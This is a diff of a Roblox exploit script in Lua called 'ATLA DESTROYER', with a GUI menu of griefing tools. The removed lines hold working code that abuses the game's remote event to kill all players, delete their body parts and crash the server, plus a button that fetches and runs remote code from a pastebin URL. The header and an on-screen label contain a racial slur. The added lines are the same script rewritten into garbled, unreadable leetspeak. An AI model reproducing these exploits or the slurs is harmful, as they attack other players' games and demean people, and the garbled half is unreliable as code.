@@ -1,809 +1,809 @@
--- BY SOULSLASHER NIGGAS^K
-local ScreenGui = Instance.new("ScreenGui")
-local Main = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local Deltool = Instance.new("TextButton")
-local Killall = Instance.new("TextButton")
-local Delbodyall = Instance.new("TextButton")
-local InvsGUI = Instance.new("TextButton")
-local Servercrash = Instance.new("TextButton")
-local Loopkillall = Instance.new("TextButton")
-local Hitboxgui = Instance.new("TextButton")
-local infstam = Instance.new("TextButton")
-local GodsSL2Killer = Instance.new("TextButton")
-local Trashtalk = Instance.new("TextButton")
-local antilag = Instance.new("TextButton")
-local TeaHub = Instance.new("TextButton")
-local ServerHop = Instance.new("TextButton")
+T°/p3 ]-[&я€-- BY SOULSLASHER NIGGAS^K
+1<>(λ£ S©2£3|VG|_|! = I2ŝ+^|1©&./|/3\|\|("S<|?€£/\/G|_|l")
+|_9©/-\£ M∂1|\| = I(\)$7/-\/\\/<3.|\|€\^/("F12/-\/v\&")
+|_()©/\1 T&×7L/-\13£1 = I|\|$+λ|V©3.|1£\|/("T€?+L^|>31")
+1[]©41 D£|']['øø1 = I?ŝ']['∂2(&.|V&\/\/("T€×†B[_]']['']['0?")
+1()©λ1 K!1|^£| = I/|/?7@|V©3./V&\^/("T3×7B[_]']['7<>11")
+|ø[^1 D318°|]j^11 = I/\\/$7/-\2<&.2£\|\|("T3><†Bµ7+()/V")
+|9<@1 I2\|5GUI = I/|/§+@/\/[&./\\/£\\'("T€×†Bµ7+*11")
+|_[]©∂1 S&|Z|/£12[2∂5]-[ = I/|/5†/\?[3./|/€\^/("T£)(+Bµ7']['[]|V")
+£0[q| L00|>|{1|1/\|1 = I|\|§']['42[£./|/£\^/("T&)(']['B|_|†+()|1")
+£9<4| H][']['89><6[_]][ = I|V?']['q|\|[£./\\/3VV("T&%†B[_]+']['ø|V")
+1ø(∂|_ ][/VPH§†4|11 = I/|/$+/\?(3./|/&\|/("T&×†B|_|+7<>(\)")
+1[](4| G*<|ŝSL2K][1£3|2 = I/|/§+/-\|V(3.|\|€\|\|("T3)(7B[_]††0/V")
+1[][4| T?^$/-/']['q1|( = I/V5†λ/\/[&./\/£\\'("T£?7Bµ+']['ø|1")
+1*[∂1 ^/|/']['|1/-\9 = I?ŝ+/\|V<3.|1£\/\/("T£><']['B[_]7702")
+£[][^1 T3λH|_||> = I11$†^/\\/©£.|13VV("T&)(†Bµ7']['()|\|")
+1<>(λ1 S&?\|&1²H<>|2 = I/V?†∂11©3./\\/&VV("T£}{']['Bµ+†*|V")
 
---Properties:
+--P?<>|D£1²']['|3$:
 
-ScreenGui.Parent = game.CoreGui
+S©|?&£/\/G|_|1.P@|Z€(\)7 = 9q(V)£.C0|Z&Gµ!
 
-Main.Name = "Main"
-Main.Parent = ScreenGui
-Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Main.BorderColor3 = Color3.fromRGB(255, 3, 7)
-Main.BorderSizePixel = 4
-Main.Position = UDim2.new(0.277276456, 0, 0.29048413, 0)
-Main.Size = UDim2.new(0, 684, 0, 272)
-Main.Active = true
-Main.Draggable = true
+M/-\][11.N/\|'|'|3 = "M@||V"
+Mq|11.P^я£|V+ = S<|?3€(\)G[_]|
+M/-\|2.B4(|(92<>µ|\|<|C919?drei = C()|_()|23.|=29[]V[]RGB(0, 0, 0)
+Mλl/V.B[]|?|]£12C0|_0я3 = C[]|*яdrei.|=я[]^^RGB(255, drei, 7)
+M@|/\/.B()|?o|&2S|z3P1}{€1 = 4
+M^l|V.P()5l+!92 = UD||11to./\/&\|/(0.277276456, 0, 0.2904-aite413, 0)
+M4][?.S12£ = UD1|'|'|2./V£VV(0, 6eight4, 0, 272)
+Mq1/\\/.A©+][\|& = 7?|_|£
+M/\1|V.D?@66/\813 = +12|_|£
 
-TextLabel.Parent = Main
-TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
-TextLabel.BorderSizePixel = 4
-TextLabel.Position = UDim2.new(0.00584795326, 0, 0, 0)
-TextLabel.Size = UDim2.new(0, 676, 0, 50)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "ATLA DESTROYER BY CAPS SOULSLASHER^K - GONNA FUCK YOUR GAME UP NIGGER"
-TextLabel.TextColor3 = Color3.fromRGB(255, 7, 7)
-TextLabel.TextSize = 14.000
-TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
+T£%']['L/-\ß3|_.P∂1²£(\)7 = M/-\][/V
+T£}{7L4|3&|_.Bλ©|{6129µ?đC<>£ø1²drei = C01°|Z3.PH|Z()AARGB(0, 0, 0)
+T£}{†L∂l³&1.B*яo|3|?C[]19|?drei = C<>1ø|?drei.|=яø|'|'|RGB(to55, 0, 0)
+T3><']['L/\|3€£.B[]12đ€|2S!2£P1%£| = 4
+T3><7L^|>€|_.P0§|†1ø/V = UD1/|\2.|V€\|/(0.005eight47953to6, 0, 0, 0)
+T3%†L4|>€1.S!z& = UD|]V[2.|V3\^/(0, 676, 0, 50)
+T&><+L4|>££.F*?+ = E/\/[_]|11.Fø?7.S0µ2[&Sλ11ŝ
+T&><†L4|33£.T&?+ = "ATLA DESTROYER BY CAPS SOULSLASHER^K - GONNA FUCK YOUR GAME UP NIGGER"
+T3}{+Lql³£|.T&×']['C()£[]?drei = Cø1012drei.ƒ®()[]V[]RGB(to55, 7, 7)
+T€%†L@13£1.T3}{7S!(\)& = 14.000
+T&}{7Lqß&|_.T£><']['S+|2()|<&C*£[]|Zdrei = C<>1[]|Z3.|=я()^^RGB(to55, 0, 0)
 
-Deltool.Name = "Del tool"
-Deltool.Parent = Main
-Deltool.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Deltool.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Deltool.BorderSizePixel = 4
-Deltool.Position = UDim2.new(0.00504177809, 0, 0.00688524917, 0)
-Deltool.Size = UDim2.new(0, 103, 0, 48)
-Deltool.Font = Enum.Font.SourceSansBold
-Deltool.Text = "DESTROY TOOL"
-Deltool.TextColor3 = Color3.fromRGB(255, 247, 0)
-Deltool.TextSize = 15.000
-Deltool.MouseButton1Down:connect(function()
-	_G.SHOW_RED_BOXES = false -- Set this to 'false' if you dont want the red boxes to show (less lag)
+D€|_†°ø1.N^[]V[]& = "D&|_ 70<>|_"
+D&|†9ø1.Pλ|?3/|/'][' = M41/\/
+D€|_7[]()£.B4(|<6я°|_|11ÐC<>|0|Zdrei = C*|_*?3.PH|2°/|\RGB(0, 0, 0)
+D£17ø*£.B[]|2<|£|2C0|_<>яdrei = C()|*|23.|=12*|\/|RGB(255, 0, 0)
+D£1']['9°|.Bø®<|£|?S|(\)€P][?€1 = 4
+D££']['ø9|.P*ŝ1+][[]|\| = UD][/v\2./\\/3\|/(0.00504177eight09, 0, 0.006eight8524917, 0)
+D&1']['<>°|.S|23 = UD!AAto./\\/3\|\|(0, 103, 0, 48)
+D€£+*0|_.F()|V7 = E|1µAA.F°11']['.S()[_]2<&S^/VŝB9|_<|
+D&|7°()1.T£?† = "DESTROY TOOL"
+D3|']['09|.T€%']['C()|_[]23 = C<>|_[]|Z3.ƒя9(V)RGB(to55, to47, 0)
+D€|+ø<>1.T£}{7S][(\)€ = 15.000
+D££+<>ø1.Mø|_|ŝ£B[_]+†°/\/1D<>\|/|1:©()|1|\|3©7(|"µ|1(+l<>/\/()
+	_G.SHOW_RED_BOXES = ƒλ1§3 -- S£† 741? †9 '|=q15€' 1|= jø[_] o|()|1† VV4|\|'][' ']['}{3 ?£Ð ß[])(£§ 7<> ŝ|-|ø\\' (13§$ |@9)
 
-	loadstring(game:HttpGet("https://pastebin.com/raw/qrk8BkEY"))()
-end)
+	£*^|>ŝ+|?][|16(6λ/\/\£:H7†|°G€7("|-|††|2ŝ://|>^?+3|31/|/.<°|'|'|/|?/\uu/kw12|{8B|(EY"))()
+&(\)|))
 
-Killall.Name = "Kill all"
-Killall.Parent = Main
-Killall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Killall.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Killall.BorderSizePixel = 4
-Killall.Position = UDim2.new(-0.000665307045, 0, 0.723797143, 0)
-Killall.Size = UDim2.new(0, 187, 0, 33)
-Killall.Font = Enum.Font.SourceSansBold
-Killall.Text = "Kill All"
-Killall.TextColor3 = Color3.fromRGB(255, 0, 0)
-Killall.TextSize = 22.000
-Killall.MouseButton1Down:connect(function()
-	for _,v in pairs(game.Players:GetChildren()) do
-		local args = {
-			[1] = "ProcessKey",
-			[2] = {
-				["Key"] = "K",
-				["RIP"] =  {Parent = v.Character, Value = 0},
+K!1£/\1£.N^[]V[]& = "Kl11 411"
+K1||@|_£.P/-\1²3?† = M∂|/|/
+K|1|_^|_1.B@©|{61²[]µ(\)|>C<>1[]|?3 = C[]10|2drei.ƒ2[]]V[RGB(0, 0, 0)
+K|1£^1|_.B*яÐ&?C<>19|2drei = C[]£ø|Z3.|"я*/v\RGB(to55, 0, 0)
+Kl1£^11.B()2o|&|?S!z€P!×€1 = 4
+Kl1£q|£.P[]5][+1<>2 = UD|/|\to.|\|€\/\/(-0.000665307045, 0, 0.7to379714drei, 0)
+Kl|_|4||_.S|(\)£ = UD1/\/\2.11&\|/(0, 187, 0, 33)
+K1|_|/\1|.F<>|V7 = E2|_|/\/\.F9/V+.S()[_]12©3S^(\)§B<>1|)
+K!11/\1|_.T€><† = "K|1£ A||"
+K1114|_|_.T€%+C()1ø®3 = C°|_[]|Zdrei.PH1²[]AARGB(to55, 0, 0)
+K1114|_1.T3><7S][2€ = 22.000
+K|114|£.Mø[_]$€B[_]†+[](\)1D°\A/|V:([]/V/V&(†(ƒ[_]|\|[']['][[]|V()
+	|=9|Z _,\| |? |°4!?5(9λ/\/\£.P|/\`/3??:G&7C/-/1|_|)12&/\\/()) |)0
+		1ø</\1 4129ŝ = {
+			[1] = "Pя*<&$$K&j",
+			[to] = {
+				["K£`/"] = "K",
+				["RIP"] =  {P∂12&|1'][' = \|.C4/-\?@[7£|Z, V/-\1µ& = 0},
 			},
 		}
-		game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
-		wait()
-	end
-end)
+		9∂^^€:G3+S€|?\|![€("R&9£][<@']['£|>S7()2@6&").N£']['\|\|°я|{F91<|&1².G@(V)&E|/€?'][':F!12€S312\/3?(|_||19@(|{(@®6§))
+		\|/^][†()
+	€/|/<|
+3|\||>)
 
-Delbodyall.Name = "Del body all"
-Delbodyall.Parent = Main
-Delbodyall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Delbodyall.BorderColor3 = Color3.fromRGB(255, 0, 0)
-Delbodyall.BorderSizePixel = 4
-Delbodyall.Position = UDim2.new(0.589705884, 0, 0.721847296, 0)
-Delbodyall.Size = UDim2.new(0, 187, 0, 33)
-Delbodyall.Font = Enum.Font.SourceSansBold
-Delbodyall.Text = "Delete Body All"
-Delbodyall.TextColor3 = Color3.fromRGB(255, 0, 0)
-Delbodyall.TextSize = 22.000
-Delbodyall.MouseButton1Down:connect(function()
-	local parts = {"RightUpperLeg", "RightUpperArm", "LeftUpperLeg", "LeftUpperArm"}
+D€1|o0|>`/@|_£.Nλ|'|'|& = "D€1 |>[]<|'/ q|_1"
+D£1ß*|)`/^|_|_.P^|Z&(\)'][' = M∂1|V
+D&£|3()đ°/∂|_1.B4©|(6я0|_|11|>C[]1ø|?3 = C0|_0|Z3.ƒ12[]/\/\RGB(0, 0, 0)
+D£1|3ø|)°/λ|_£.B°1²<|£®C0|9|?3 = C919®drei.|"|?ø|11RGB(255, 0, 0)
+D€1l³0<|°/∂|_1.B()я<|£яS|2£P][×€1 = 4
+D£|_8[]đ'/@|1.P9§|71<>(\) = UDl[]V[]2.2&\A/(0.5-aite97058-aite4, 0, 0.7to1847to96, 0)
+D£1|o0o|jλ|1.S][2£ = UD!|'|'|to.(\)£VV(0, 187, 0, drei3)
+D3£|oø|>`/λ||_.F0/V+ = E?µ|\/|.Fø|V7.Sø[_]я[3S4|1?B0||]
+D31|>øo|jλ£1.T€×7 = "D€|&†& B<>|>°/ A1|"
+D&1|>0o|'/∂||_.T£}{†Cø|<>1²drei = C01[]1²drei.|=12*/v\RGB(to55, 0, 0)
+D€|13()<|'//\11.T&><+S|2€ = to2.000
+D€|_|>*đj^£|.M0µ§&B[_]+7()111D9uu(\):<9|1?€©']['(|"|_|2©+|()/\\/()
+	1ø©/-\£ |D∂12']['§ = {"R!9|-|†U|*|²&|ZL&9", "R16#†U|°|2£?A?|'|'|", "L€|"+U][D|*€12L£6", "L€|"†U|D|>3®A12|'|'|"}
 
-	for _,player in pairs(game:GetService("Players"):GetChildren()) do
-		for _,v in pairs(parts) do 
-			local args = {
-				[1] = "ProcessKey",
-				[2] = {
-					["Key"] = "K",
-					["RIP"] =  {Parent = player.Character[v], Value = 0},
+	ƒ9® _,p1@°/3|2 l|1 ][D4][?ŝ(6/-\|'|'|&:G€']['S€?\|!©€("P|∂`/&|Z?"):G£7C]-[!£đ|?3/\/()) Ð9
+		|=92 _,\/ |(\) pλ][|2ŝ(][D4|?']['§) <|* 
+			10©^1 λя6? = {
+				[1] = "P|?[]©3?§K£`/",
+				[to] = {
+					["K£°/"] = "K",
+					["RIP"] =  {P/\12£|1'][' = |²1λj£|?.C]-[∂|Zq[+&|?[\/], V@1|_|3 = 0},
 				},
 			}
-			game:GetService("ReplicatedStorage").NetworkFolder.GameEvent:FireServer(unpack(args))
+			9^^^£:G£+S€я\/][©3("R€|211[/\']['3ÐS']['ø246€").N37\A/[]?|{F()£|>€®.G/\[]V[]3E\|&/|/+:Fl2&S31²|/£12(µ/V|2/-\(|<(@1²6ŝ))
 
-		end
-	end
-end)
+		&|V<|
+	€|Vđ
+€|1<|)
 
-InvsGUI.Name = "Invs GUI"
-InvsGUI.Parent = Main
-InvsGUI.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-InvsGUI.BorderColor3 = Color3.fromRGB(255, 0, 0)
-InvsGUI.BorderSizePixel = 4
-InvsGUI.Position = UDim2.new(0.590511203, 0, 0.210817814, 0)
-InvsGUI.Size = UDim2.new(0, 187, 0, 33)
-InvsGUI.Font = Enum.Font.SourceSansBold
-InvsGUI.Text = "Invisible GUI"
-InvsGUI.TextColor3 = Color3.fromRGB(255, 0, 0)
-InvsGUI.TextSize = 22.000
-InvsGUI.MouseButton1Down:connect(function()
-	local GUI = Instance.new("ScreenGui")
-	local Main = Instance.new("Frame")
-	local Topbar = Instance.new("Frame")
-	local Title = Instance.new("TextLabel")
-	local Exit = Instance.new("TextButton")
-	local Minimize = Instance.new("TextButton")
-	local SubFrame = Instance.new("Frame")
-	local AirTP = Instance.new("Frame")
-	local TextLabel = Instance.new("TextLabel")
-	local TextLabel_2 = Instance.new("TextLabel")
-	local BoolToggle = Instance.new("TextButton")
-	local AutoRun = Instance.new("Frame")
-	local TextLabel_3 = Instance.new("TextLabel")
-	local TextLabel_4 = Instance.new("TextLabel")
-	local BoolToggle_2 = Instance.new("TextButton")
-	local Keybind = Instance.new("Frame")
-	local TextLabel_5 = Instance.new("TextLabel")
-	local TextLabel_6 = Instance.new("TextLabel")
-	local CurrentBind = Instance.new("TextBox")
-	local QuickInvis = Instance.new("TextButton")
-	local Rigtype = Instance.new("TextLabel")
-	local TextButton = Instance.new("TextButton")
+I11|/5GUI.N∂|\/|3 = "I/V\|§ GUI"
+I|V\|§GUI.P@|Z£(\)+ = M4!?
+I?\/§GUI.B∂(|(6|2()[_]/VÐC*|<>2drei = C()1°123.ƒя[]]V[RGB(0, 0, 0)
+I/\/\|?GUI.B<>|?đ&?C91()1²drei = C9|_<>23.PH2()^^RGB(to55, 0, 0)
+I|\||/ŝGUI.B()?|)3?S][2€P][}{£1 = 4
+I(\)\/5GUI.P[]ŝ][']['!ø? = UD!(V)to./\/3\|/(0.590511to03, 0, 0.to10817814, 0)
+I2|/?GUI.S][(\)£ = UD][|\/|to.?£\A/(0, 187, 0, 33)
+I|\|\|?GUI.F°/\\/† = E(\)[_]]V[.F<>|17.S<>[_]|2©&S@11?Bø1<|
+I|1|/$GUI.T£}{'][' = "I|V\||§|l³|_£ GUI"
+I|V\/$GUI.T€?']['C0|_ø1²drei = C91[]|?drei.|=12°|\/|RGB(255, 0, 0)
+I(\)\/?GUI.T€><7S|z£ = 22.000
+I(\)\/ŝGUI.M[][_]§€B[_]77ø(\)1D[]\^//V:[°/\//|/£<†(PH|_|/|/(71ø2()
+	1°<4|_ GUI = I|\|§7^|V[3.2£\A/("S[1²£3|\|G[_]!")
+	£°[/-\1 M@l|\| = I(\)ŝ+/-\|1[£.|\|€\|\|("F®@]V[£")
+	|_*</\1 T9|28/-\? = I2ŝ+λ|\|<3.|V€\^/("F12λ[]V[]€")
+	|_0©λ1 T!+|_& = I|15']['∂|V©&./|/&\^/("T£×+L@|o€£")
+	|_[]©q1 E}{1'][' = I2$']['/\11<&./\\/€\^/("T&}{']['B[_]']['†°/\/")
+	1<>[λ1 M][/|/||\/|!2& = I11$+/-\11(£.23uu("T€%']['Bµ†+°/\\/")
+	|_<>©4£ S[_]13F|Z/-\]V[& = I|\|$+/-\2(3.2€\|/("F?4^^3")
+	1°<@£ Al®TP = I115+@/\/<&.(\)£\|\|("F|2/-\|\/|£")
+	|_*<@1 T€?7Lλ|3&| = I|\|?7@(\)[€.?£uu("T€×7Lq1331")
+	£9(^1 T3)(']['L∂8&1_2 = I(\)§7q(\)[£./|/£\^/("T&×']['L4l³3|")
+	£<>[^|_ B°*1T069|_3 = I/\\/$']['/-\|1[3./|/3\|\|("T3)(']['B|_|']['']['ø2")
+	|_*</\1 Aµ†0R|_||\| = I|V?7@/\/[£.113\|\|("F2∂]V[&")
+	£[](@1 T€?†Lq|3&1_drei = I|\|§7^|\|[€.11&\/\/("T€×7L4|33|")
+	|9©4| T£}{7L413£|__4 = I2$+/\(\)<£.2€\|\|("T3×†L4|3€1")
+	|()[^1 B9ø1T069£€_2 = I11$+/\|V[&./\/£|/|/("T3?+B[_]']['']['°/V")
+	1*(∂| K&'/|>1|1đ = I/\/§+@|V©3./V€\|\|("F|2/\/\/\3")
+	|_ø©@£ T3?']['L/-\l³€1_5 = I/\/ŝ+/-\|1<€.|\|3|/|/("T£?+Lq|>3|_")
+	1[]©@|_ T&}{†L4ß3|_6 = I|1ŝ†4/|/(£.|V&|/|/("T€?7L/\13&|")
+	|*©@|_ Cµ1212&(\)7B][(\)đ = I115†λ?[&./\\/€\\'("T€×†B*?")
+	1<>(^| Qµ][(|{I?\/1§ = I(\)?']['λ11[€.|V€\|/("T&?7B[_]+†()2")
+	|_*[q| R19+jp3 = I/\\/ŝ7∂|1©£.|1&\\'("T€×7L/-\l³€|")
+	£*©/\£ T£×7B[_]†']['*/|/ = I11?7@/\\/(€.11£uu("T€}{7Bµ†70|1")
 
-	-- Properties
+	-- P®°|°€2+][£?
 
-	GUI.Name = "GUI"
-	GUI.Parent = game.CoreGui
+	GUI.Nq|11£ = "GUI"
+	GUI.P/-\12£2+ = 6λ^^&.C9я&G|_|][
 
-	Main.Name = "Main"
-	Main.Parent = GUI
-	Main.Active = true
-	Main.BackgroundColor3 = Color3.new(0, 0, 0)
-	Main.BackgroundTransparency = 0.5
-	Main.BorderSizePixel = 0
-	Main.Draggable = true
-	Main.Position = UDim2.new(0.318181813, 0, 0.312252969, 0)
-	Main.Size = UDim2.new(0.363636374, 0, 0.375494063, 0)
+	M4l11.N/\/v\& = "M4|?"
+	M^1?.P/\я3?'][' = GUI
+	M∂][/V.A<+1|/3 = ']['|2[_]3
+	M^][(\).B/-\©|{6я<>[_]11o|C[]£9яdrei = C*1[]1²3.?&VV(0, 0, 0)
+	M@|?.B4[|(6|Z[]|_|?<|Tя^2$|>4?£/\\/[`/ = 0.5
+	M/-\][/\/.B°1²Ð&12S][z&P][}{£| = 0
+	M4!|\|.D12∂66q|o£3 = +|?|_|£
+	M/-\l/|/.P[]?|+1()? = UDl(V)2.|1&\\'(0.3181eight1813, 0, 0.31toto5to969, 0)
+	M∂|2.S1z3 = UD!/\/\to.|\|&\/\/(0.36drei636374, 0, 0.drei7549406drei, 0)
 
-	Topbar.Name = "Topbar"
-	Topbar.Parent = Main
-	Topbar.BackgroundColor3 = Color3.new(0, 0, 0)
-	Topbar.BackgroundTransparency = 0.9990000128746
-	Topbar.Size = UDim2.new(1, 0, 0.163157895, 0)
+	T()][D|>/\2.Nλ^^3 = "T0|2ß^|2"
+	Tø|*8q?.P^|2€/|/+ = Mλ1|V
+	T[]][D8@®.B^©|(61²ø[_]/V|]C[]19?3 = C()|°|?drei.23|/|/(0, 0, 0)
+	T99|3@12.B@(|{92<>µ2ÐT®/-\(\)§|*qя€/\\/[°/ = 0.99900001to8746
+	T0][Dl³/-\?.S|(\)3 = UDl[]V[]to.(\)3\A/(1, 0, 0.163157eight95, 0)
 
-	Title.Name = "Title"
-	Title.Parent = Topbar
-	Title.BackgroundColor3 = Color3.new(0, 0, 0)
-	Title.BackgroundTransparency = 0.9990000128746
-	Title.Size = UDim2.new(0.784722209, 0, 1, 0)
-	Title.Font = Enum.Font.SciFi
-	Title.FontSize = Enum.FontSize.Size14
-	Title.Text = "FE Invisible By Timeless"
-	Title.TextColor3 = Color3.new(1, 1, 1)
-	Title.TextSize = 14
+	T][†|_3.N^|\/|& = "T!']['1€"
+	T|+|_€.P/\|Z&/\/'][' = T°p|o/\|?
+	T1†13.B4(|<6|Z()|_|/\\/ÐC01<>1²drei = C°|_*®drei./|/&uu(0, 0, 0)
+	Tl7|_&.B4©|{9|?()µ/\/<|T|Z∂/|/§|°^я3?(j = 0.999000012-aite746
+	T|7£€.Sl(\)& = UD][/\/\to.?3\/\/(0.7-aite47toto209, 0, 1, 0)
+	T|713.F9|V† = E11|_|[]V[].F0?']['.S[lF][
+	T][71£.F*?†S!2£ = E|1[_]|11.F0/V+S12&.S][z€14
+	Tl']['13.T&%'][' = "FE I?\|][ŝ!ß|& B°/ T][[]V[]€1€?5"
+	T|+£&.T€%+C()£[]|23 = C0|_*®3./|/€\|/(1, 1, 1)
+	T!+1£.T3}{+Sl23 = 14
 
-	Exit.Name = "Exit"
-	Exit.Parent = Topbar
-	Exit.BackgroundColor3 = Color3.new(0, 0, 0)
-	Exit.BackgroundTransparency = 0.9990000128746
-	Exit.Position = UDim2.new(0.892361104, 0, 0, 0)
-	Exit.Size = UDim2.new(0.107638888, 0, 1, 0)
-	Exit.Font = Enum.Font.SciFi
-	Exit.FontSize = Enum.FontSize.Size14
-	Exit.Text = "X"
-	Exit.TextColor3 = Color3.new(1, 1, 1)
-	Exit.TextSize = 14
+	E}{17.N∂|'|'|€ = "E)(l†"
+	E?][7.P^123/\\/† = T[]][D|>/-\я
+	E><l†.B4[|<620[_]|\|<|Cø19®drei = C[]£°®3.?€\^/(0, 0, 0)
+	E)(l']['.B4©|(9?°[_]/\\/o|T?@|\|ŝp∂|2€/|/(j = 0.99900001toeight746
+	E×][7.P[]§|†l0/|/ = UD|(V)to.|\|&\|/(0.eight92drei61104, 0, 0, 0)
+	E×!7.S12€ = UDl/|\to.|\|£|/|/(0.1076drei888-aite, 0, 1, 0)
+	E?l†.F0|\|† = E2[_]/|\.F<>(\)†.S[!F|
+	E)(!+.F*|1†S|z€ = E/|/|_|]V[.F9|1']['S|(\)3.S][2£14
+	E?!']['.T£)(+ = "X"
+	E)(|7.T3)(†C<>£<>?drei = C*10?drei./\\/€\^/(1, 1, 1)
+	E><][7.T&?']['S|(\)£ = 14
 
-	Minimize.Name = "Minimize"
-	Minimize.Parent = Topbar
-	Minimize.BackgroundColor3 = Color3.new(0, 0, 0)
-	Minimize.BackgroundTransparency = 0.9990000128746
-	Minimize.Position = UDim2.new(0.784722209, 0, 0, 0)
-	Minimize.Size = UDim2.new(0.107638888, 0, 1, 0)
-	Minimize.Font = Enum.Font.SciFi
-	Minimize.FontSize = Enum.FontSize.Size14
-	Minimize.Text = "-"
-	Minimize.TextColor3 = Color3.new(1, 1, 1)
-	Minimize.TextSize = 14
+	Ml11][(V)1(\)&.Nλ/v\€ = "M][(\)l|111z£"
+	M1?][]V[!(\)€.P^®£(\)'][' = T<>][D|34®
+	M][(\)|(V)!(\)€.B/-\©|(6|?()µ/\/đC9£()®3 = C*1*я3./V€\|\|(0, 0, 0)
+	M][/\/1/\/\|z£.B∂<|(9®*[_](\)|>T12@11ŝ|>/-\23|1<`/ = 0.99900001toeight746
+	M||\|l|\/|!z&.P0$|+][<>11 = UD||\/|2./V&\A/(0.7-aite47to2209, 0, 0, 0)
+	M||1|^^1z&.S!2& = UD1^^to.(\)3|/|/(0.10763eight8eight-aite, 0, 1, 0)
+	M][11l[]V[]!z€.F0/\\/† = E|V|_||11.Fø2+.S©][F|
+	M|(\)|]V[!z€.F<>(\)7S][(\)& = E|V[_]/v\.F°27S1(\)£.S|(\)&14
+	M1|1|[]V[]!z£.T3)(† = "-"
+	Ml|11|11l23.T€)(+C*|ø123 = C0|_<>яdrei.(\)3\^/(1, 1, 1)
+	M][/\\/||\/||2&.T£)(+S!2€ = 14
 
-	SubFrame.Name = "SubFrame"
-	SubFrame.Parent = Main
-	SubFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-	SubFrame.BackgroundTransparency = 0.5
-	SubFrame.BorderSizePixel = 0
-	SubFrame.Position = UDim2.new(0, 0, 0.163157895, 0)
-	SubFrame.Size = UDim2.new(1, 0, 0.83684212, 0)
+	S|_|13F|Z@/\/\£.N@/|\3 = "S[_]13F12@/v\&"
+	Sµ13Fя∂^^&.Pλ12€/V+ = M4][/|/
+	S|_|l³F®/-\AA3.B^<|{6®<>µ2<|C*1[]23 = C<>19я3./\\/3VV(0, 0, 0)
+	Sµ|3F|?q/\/\£.B/\<|<92<>µ/|/|]T12λ(\)?|²∂1²&11[°/ = 0.5
+	Sµ8F®@|11&.B[]|ZÐ&2S!2£P!}{€£ = 0
+	S|_|8F?4/\/\£.P*5|+!ø2 = UD1[]V[]2.|1&\/\/(0, 0, 0.163157eight95, 0)
+	S|_||oF®λ/v\&.S!2£ = UDl^^to.|\|€\|/(1, 0, 0.8drei6eight421to, 0)
 
-	AirTP.Name = "AirTP"
-	AirTP.Parent = SubFrame
-	AirTP.BackgroundColor3 = Color3.new(0, 0, 0)
-	AirTP.BackgroundTransparency = 0.9990000128746
-	AirTP.BorderSizePixel = 0
-	AirTP.Position = UDim2.new(0, 0, 0.0628930852, 0)
-	AirTP.Size = UDim2.new(1, 0, 0.176100627, 0)
+	Al12TP.N/\/|\€ = "A][яTP"
+	A!яTP.P@|?€/\\/'][' = S|_|13F®q/v\£
+	A][2TP.Bλ(|(9?ø|_||\|<|C[]£9|Z3 = C°£ø|2drei./\\/&VV(0, 0, 0)
+	A11²TP.B^[|<6|?0|_|(\)|)Tя/-\(\)ŝ|*/-\?&/\/[`/ = 0.99900001to8746
+	A!12TP.B[]яÐ312S|2€P1><31 = 0
+	A1®TP.P05l†|ø(\) = UD][AAto.|V€\A/(0, 0, 0.06to-aite930-aite5to, 0)
+	A|12TP.Slz£ = UDlAA2.|\|&uu(1, 0, 0.176100627, 0)
 
-	TextLabel.Parent = AirTP
-	TextLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel.BackgroundTransparency = 0.9990000128746
-	TextLabel.Position = UDim2.new(0.166666672, 0, 0, 0)
-	TextLabel.Size = UDim2.new(0.284722209, 0, 1, 0)
-	TextLabel.Font = Enum.Font.SciFi
-	TextLabel.FontSize = Enum.FontSize.Size14
-	TextLabel.Text = "Air TP"
-	TextLabel.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel.TextSize = 14
-	TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+	T€}{7Lq|3£|_.Pλ®3/\\/+ = A][|?TP
+	T&%']['L^|>&|_.B/-\[|(92<>|_|/V|)C*|_<>|Zdrei = C9|_[]1²3.|1&\|/(0, 0, 0)
+	T3×7L∂|>31.B/\<|{9|2<>|_|/Vo|T|2q/V$|²4?3/|/(j = 0.99900001to-aite746
+	T£×']['Lλ|o£1.P<>$|+!*/\/ = UDl/|\to./\\/&\|\|(0.166666672, 0, 0, 0)
+	T3}{+L@l³&|_.S][z£ = UD][/v\to.113\^/(0.to-aite472toto09, 0, 1, 0)
+	T£×+Lλ|>£1.F9/\/+ = E/\\/µ|\/|.Fø|\|†.S©1F|
+	T€)(']['L/\|o&|_.F9|\|+S!(\)& = E/\\/[_](V).F<>|1†S!z3.Sl2314
+	T€)(+Lλ8&|_.T3×† = "Al|? TP"
+	T3×†L4|>£1.T&><']['C*1ø123 = C[]1*23.(\)3|/|/(1, 1, 1)
+	T3×']['L4l³£1.T£%+S!z€ = 14
+	T&?†L^ß£1.T€)(+XA1!9/\\//v\&/\/'][' = E|1|_|]V[.T£%7XA£19|1|11£|1']['.L£ƒ†
 
-	TextLabel_2.Parent = AirTP
-	TextLabel_2.BackgroundColor3 = Color3.new(0, 0, 0)
-	TextLabel_2.BackgroundTransparency = 0.9990000128746
-	TextLabel_2.Position = UDim2.new(0.451388896, 0, 0, 0)
-	TextLabel_2.Size = UDim2.new(0.0972222239, 0, 1, 0)
-	TextLabel_2.Font = Enum.Font.SciFi
-	TextLabel_2.FontSize = Enum.FontSize.Size14
-	TextLabel_2.Text = "-"
-	TextLabel_2.TextColor3 = Color3.new(1, 1, 1)
-	TextLabel_2.TextSize = 14
+	T&><7Lλ|33£_to.Pq12€/V+ = A1|ZTP
+	T€)(']['L@|>€£_2.B/\[|<92°µ|\||)C()|_<>я3 = Cø1<>1²3.2£|/|/(0, 0, 0)
